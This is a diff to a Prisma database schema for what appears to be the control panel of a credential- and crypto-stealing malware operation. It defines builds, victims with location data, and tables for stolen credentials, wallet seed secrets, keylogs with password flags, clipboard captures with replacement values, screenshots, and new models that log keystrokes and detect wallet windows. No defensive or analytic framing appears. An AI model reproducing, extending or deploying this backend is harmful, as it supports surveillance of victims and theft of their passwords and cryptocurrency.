@@ -102,94 +102,96 @@ model Session {
 }
 
 model Build {
-  id          String      @id @default(uuid()) @db.Uuid
-  name        String
-  version     String
-  profile     Profile     @default(full)
-  universal   Boolean     @default(false)
-  buildId      String     @unique @db.Uuid
-  tokenHash    String     @unique
+  id               String      @id @default(uuid()) @db.Uuid
+  name             String
+  version          String
+  profile          Profile     @default(full)
+  universal        Boolean     @default(false)
+  buildId          String      @unique @db.Uuid
+  tokenHash        String      @unique
   /// Envelope-sealed build secret. Old rows may still hold legacy plaintext.
-  secret       String
+  secret           String
   /// 1 = HMAC(secret,"enroll") legacy; 2 = HKDF label + per-device key salt.
-  enrollScheme Int        @default(1)
-  config       Json
+  enrollScheme     Int         @default(1)
+  config           Json
   /// Hours an unverified enroll leaves the previous token valid. 0 disables grace.
-  enrollGraceHours Int    @default(24)
-  jarPath     String?
-  status      BuildStatus @default(draft)
-  createdById String?     @db.Uuid
-  createdAt   DateTime    @default(now())
-  revokedAt   DateTime?
-  createdBy   Operator?   @relation(fields: [createdById], references: [id], onDelete: SetNull)
-  victims     Victim[]
+  enrollGraceHours Int         @default(24)
+  jarPath          String?
+  status           BuildStatus @default(draft)
+  createdById      String?     @db.Uuid
+  createdAt        DateTime    @default(now())
+  revokedAt        DateTime?
+  createdBy        Operator?   @relation(fields: [createdById], references: [id], onDelete: SetNull)
+  victims          Victim[]
 
   @@index([status, createdAt])
   @@index([universal])
 }
 
 model Victim {
-  id              String           @id @default(uuid()) @db.Uuid
-  buildId         String           @db.Uuid
-  externalId      String           @default(uuid()) @db.Uuid
-  hostname        String
-  os              String
-  osVersion       String           @default("")
-  arch            String           @default("x86_64")
-  username        String
-  ip              String?
-  country         String?
-  countryCode     String?
-  city            String?
-  lat             Float?
-  lon             Float?
-  tags            String[]         @default([])
-  status          VictimStatus     @default(online)
-  profile         Profile          @default(full)
-  agentVersion    String           @default("")
+  id                    String            @id @default(uuid()) @db.Uuid
+  buildId               String            @db.Uuid
+  externalId            String            @default(uuid()) @db.Uuid
+  hostname              String
+  os                    String
+  osVersion             String            @default("")
+  arch                  String            @default("x86_64")
+  username              String
+  ip                    String?
+  country               String?
+  countryCode           String?
+  city                  String?
+  lat                   Float?
+  lon                   Float?
+  tags                  String[]          @default([])
+  status                VictimStatus      @default(online)
+  profile               Profile           @default(full)
+  agentVersion          String            @default("")
   /// Negotiated contract (1 while a legacy agent is in use).
-  contractVersion Int              @default(1)
+  contractVersion       Int               @default(1)
   /// Intersection of declared agent capabilities and server support.
-  capabilities    String[]         @default([])
+  capabilities          String[]          @default([])
   /// Bumped on capability refresh; the agent re-reads on change.
-  configEpoch     Int              @default(1)
-  deviceTokenEnc  String
+  configEpoch           Int               @default(1)
+  deviceTokenEnc        String
   /// 1 = legacy (secret+build+victim); 2 = per-device key salt.
-  keyScheme       Int              @default(1)
+  keyScheme             Int               @default(1)
   /// Identity salt generation. Rotating it never changes `keySaltEnc` in place.
-  keyEpoch        Int              @default(1)
-  keySaltEnc      String?
+  keyEpoch              Int               @default(1)
+  keySaltEnc            String?
   /// confirmed | unverified | grace | revoked
-  identityState   String           @default("confirmed")
-  graceUntil      DateTime?
+  identityState         String            @default("confirmed")
+  graceUntil            DateTime?
   /// Rotation and unverified-enroll grace. Both are 24 h maximum.
-  prevTokenEnc        String?
-  prevTokenExpiresAt  DateTime?
-  pendingTokenEnc     String?
+  prevTokenEnc          String?
+  prevTokenExpiresAt    DateTime?
+  pendingTokenEnc       String?
   pendingTokenExpiresAt DateTime?
-  firstSeenAt     DateTime         @default(now())
-  lastHeartbeatAt DateTime         @default(now())
+  firstSeenAt           DateTime          @default(now())
+  lastHeartbeatAt       DateTime          @default(now())
   /// Liveness from a real agent message; bridge pings never touch it.
-  lastAgentMessageAt DateTime      @default(now())
+  lastAgentMessageAt    DateTime          @default(now())
   /// Control-channel cursors: last seq accepted from / processed outbound.
-  wsSeqIn         BigInt           @default(0)
-  wsSeqOut        BigInt           @default(0)
-  revokedAt       DateTime?
-  build           Build            @relation(fields: [buildId], references: [id], onDelete: Restrict)
-  sessions        SessionInfo[]
-  tasks           Task[]
-  artifacts       Artifact[]
-  uploads         Upload[]
-  wallets         Wallet[]
-  credentials     Credential[]
-  clipboard       ClipboardEntry[]
-  keylogs         Keylog[]
-  screenshots     Screenshot[]
-  events          Event[]
-  notifications   Notification[]
-  wsSeen          WsSeen[]
-  keyEpochs       VictimKeyEpoch[]
-  discord         DiscordLink?
+  wsSeqIn               BigInt            @default(0)
+  wsSeqOut              BigInt            @default(0)
+  revokedAt             DateTime?
+  build                 Build             @relation(fields: [buildId], references: [id], onDelete: Restrict)
+  sessions              SessionInfo[]
+  tasks                 Task[]
+  artifacts             Artifact[]
+  uploads               Upload[]
+  wallets               Wallet[]
+  credentials           Credential[]
+  clipboard             ClipboardEntry[]
+  timeline              TimelineEntry[]
+  walletDetections      WalletDetection[]
+  keylogs               Keylog[]
+  screenshots           Screenshot[]
+  events                Event[]
+  notifications         Notification[]
+  wsSeen                WsSeen[]
+  keyEpochs             VictimKeyEpoch[]
+  discord               DiscordLink?
 
   @@unique([buildId, hostname, username])
   @@index([status, lastHeartbeatAt])
@@ -227,24 +229,24 @@ model SessionInfo {
 }
 
 model Task {
-  id          String     @id @default(uuid()) @db.Uuid
-  victimId    String     @db.Uuid
-  name        String
-  params      Json       @default("{}")
-  status      TaskStatus @default(queued)
-  priority    Int        @default(0)
-  timeoutSec  Int        @default(120)
-  leaseUntil  DateTime?
-  attempts    Int        @default(0)
-  result      Json?
-  error       String?
-  createdById String?    @db.Uuid
-  createdAt   DateTime   @default(now())
-  notBefore   DateTime   @default(now())
-  finishedAt  DateTime?
-  victim      Victim     @relation(fields: [victimId], references: [id], onDelete: Cascade)
-  createdBy   Operator?  @relation(fields: [createdById], references: [id], onDelete: SetNull)
-  artifacts   Artifact[]
+  id               String     @id @default(uuid()) @db.Uuid
+  victimId         String     @db.Uuid
+  name             String
+  params           Json       @default("{}")
+  status           TaskStatus @default(queued)
+  priority         Int        @default(0)
+  timeoutSec       Int        @default(120)
+  leaseUntil       DateTime?
+  attempts         Int        @default(0)
+  result           Json?
+  error            String?
+  createdById      String?    @db.Uuid
+  createdAt        DateTime   @default(now())
+  notBefore        DateTime   @default(now())
+  finishedAt       DateTime?
+  victim           Victim     @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  createdBy        Operator?  @relation(fields: [createdById], references: [id], onDelete: SetNull)
+  artifacts        Artifact[]
   discordMessageId String?
 
   @@index([victimId, status, createdAt])
@@ -271,53 +273,53 @@ model Upload {
 }
 
 model Artifact {
-  id            String         @id @default(uuid()) @db.Uuid
-  victimId      String         @db.Uuid
-  uploadId      String?        @unique @db.Uuid
-  source        String         @default("api")
-  discordMessageId String?     @unique
-  taskId        String?        @db.Uuid
-  module        String
-  bytes         Int
-  sha256        String
-  containerPath String
-  status        ArtifactStatus @default(uploading)
-  manifest      Json?
-  error         String?
-  createdAt     DateTime       @default(now())
-  processedAt   DateTime?
-  victim        Victim         @relation(fields: [victimId], references: [id], onDelete: Cascade)
-  task          Task?          @relation(fields: [taskId], references: [id], onDelete: SetNull)
-  upload        Upload?        @relation(fields: [uploadId], references: [id], onDelete: Cascade)
-  wallets       Wallet[]
-  secrets       WalletSecret[]
-  screenshots   Screenshot[]
-  credentials   Credential[]
+  id               String         @id @default(uuid()) @db.Uuid
+  victimId         String         @db.Uuid
+  uploadId         String?        @unique @db.Uuid
+  source           String         @default("api")
+  discordMessageId String?        @unique
+  taskId           String?        @db.Uuid
+  module           String
+  bytes            Int
+  sha256           String
+  containerPath    String
+  status           ArtifactStatus @default(uploading)
+  manifest         Json?
+  error            String?
+  createdAt        DateTime       @default(now())
+  processedAt      DateTime?
+  victim           Victim         @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  task             Task?          @relation(fields: [taskId], references: [id], onDelete: SetNull)
+  upload           Upload?        @relation(fields: [uploadId], references: [id], onDelete: Cascade)
+  wallets          Wallet[]
+  secrets          WalletSecret[]
+  screenshots      Screenshot[]
+  credentials      Credential[]
 
   @@index([victimId, module, createdAt])
   @@index([status])
 }
 
 model Wallet {
-  id           String      @id @default(uuid()) @db.Uuid
-  victimId     String      @db.Uuid
-  artifactId   String?     @db.Uuid
+  id           String         @id @default(uuid()) @db.Uuid
+  victimId     String         @db.Uuid
+  artifactId   String?        @db.Uuid
   kind         String
   targetId     String
   label        String?
   source       String?
   path         String
-  state        WalletState @default(found)
-  decryptState String      @default("none")
+  state        WalletState    @default(found)
+  decryptState String         @default("none")
   decryptError String?
   reason       String?
   address      String?
   balance      String?
-  createdAt    DateTime    @default(now())
-  lastSeenAt   DateTime    @default(now())
-  updatedAt    DateTime    @default(now()) @updatedAt
-  victim       Victim      @relation(fields: [victimId], references: [id], onDelete: Cascade)
-  artifact     Artifact?   @relation(fields: [artifactId], references: [id], onDelete: SetNull)
+  createdAt    DateTime       @default(now())
+  lastSeenAt   DateTime       @default(now())
+  updatedAt    DateTime       @default(now()) @updatedAt
+  victim       Victim         @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  artifact     Artifact?      @relation(fields: [artifactId], references: [id], onDelete: SetNull)
   secrets      WalletSecret[]
 
   @@unique([victimId, path])
@@ -328,19 +330,19 @@ model Wallet {
 }
 
 model WalletSecret {
-  id           String    @id @default(uuid()) @db.Uuid
-  walletId     String    @db.Uuid
-  kind         String
-  valueEnc     String
-  valueHash    String
-  words        Int?
-  confidence   Float?
-  source       String?
-  artifactId   String?   @db.Uuid
-  firstSeenAt  DateTime  @default(now())
-  updatedAt    DateTime  @default(now()) @updatedAt
-  wallet       Wallet    @relation(fields: [walletId], references: [id], onDelete: Cascade)
-  artifact     Artifact? @relation(fields: [artifactId], references: [id], onDelete: SetNull)
+  id          String    @id @default(uuid()) @db.Uuid
+  walletId    String    @db.Uuid
+  kind        String
+  valueEnc    String
+  valueHash   String
+  words       Int?
+  confidence  Float?
+  source      String?
+  artifactId  String?   @db.Uuid
+  firstSeenAt DateTime  @default(now())
+  updatedAt   DateTime  @default(now()) @updatedAt
+  wallet      Wallet    @relation(fields: [walletId], references: [id], onDelete: Cascade)
+  artifact    Artifact? @relation(fields: [artifactId], references: [id], onDelete: SetNull)
 
   @@unique([walletId, kind, valueHash])
   @@index([walletId, kind])
@@ -369,34 +371,73 @@ model Credential {
   @@index([targetId])
 }
 
-model ClipboardEntry {
+model TimelineEntry {
   id       String   @id @default(uuid()) @db.Uuid
   victimId String   @db.Uuid
   ts       DateTime @default(now())
-  updatedAt DateTime @default(now())
-  count    Int      @default(1)
-  window   String   @default("")
+  /// keystroke | clipboard
+  origin   String
   process  String   @default("")
+  title    String   @default("")
   content  String
   kind     String   @default("text")
-  replaced String?
+  patterns String[] @default([])
+  count    Int      @default(1)
   victim   Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@index([victimId, ts])
+  @@index([victimId, origin])
+}
+
+/// Una ventana/proceso por proveedor; las repeticiones incrementan `count`.
+model WalletDetection {
+  id          String    @id @default(uuid()) @db.Uuid
+  victimId    String    @db.Uuid
+  provider    String
+  /// extension | desktop | mobile | unknown
+  kind        String    @default("unknown")
+  process     String    @default("")
+  window      String    @default("")
+  url         String?
+  pid         Int?
+  firstSeenAt DateTime  @default(now())
+  lastSeenAt  DateTime  @default(now())
+  closedAt    DateTime?
+  count       Int       @default(1)
+  victim      Victim    @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@unique([victimId, provider, window])
+  @@index([victimId, lastSeenAt])
+}
+
+model ClipboardEntry {
+  id        String   @id @default(uuid()) @db.Uuid
+  victimId  String   @db.Uuid
+  ts        DateTime @default(now())
+  updatedAt DateTime @default(now())
+  count     Int      @default(1)
+  window    String   @default("")
+  process   String   @default("")
+  content   String
+  kind      String   @default("text")
+  replaced  String?
+  victim    Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
 
   @@index([victimId, ts])
   @@index([victimId, kind])
 }
 
 model Keylog {
-  id       String   @id @default(uuid()) @db.Uuid
-  victimId String   @db.Uuid
-  ts       DateTime @default(now())
+  id        String   @id @default(uuid()) @db.Uuid
+  victimId  String   @db.Uuid
+  ts        DateTime @default(now())
   updatedAt DateTime @default(now())
-  count    Int      @default(1)
-  process  String   @default("")
-  title    String   @default("")
-  text     String
-  password Boolean  @default(false)
-  victim   Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+  count     Int      @default(1)
+  process   String   @default("")
+  title     String   @default("")
+  text      String
+  password  Boolean  @default(false)
+  victim    Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
 
   @@index([victimId, ts])
   @@index([victimId, password])
